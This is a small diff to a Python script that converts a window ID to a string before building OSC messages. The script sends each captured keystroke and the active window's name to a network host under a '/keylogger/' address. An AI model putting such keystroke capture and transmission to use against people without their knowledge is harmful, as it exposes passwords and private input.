@@ -27,7 +27,7 @@ def printevent(event):
 
 def sendevent(event, down):
 	bundle=osc.createBundle()
-	osc.appendToBundle(bundle, "/keylogger/window/"+event.Window+"/key", [event.Key, down])
+	osc.appendToBundle(bundle, "/keylogger/window/"+str(event.Window)+"/key", [event.Key, down])
 	osc.appendToBundle(bundle, "/keylogger/WindowName/"+event.WindowName+"/key", [event.Key, down])
 	osc.sendBundle(bundle, Host, Port)
 	
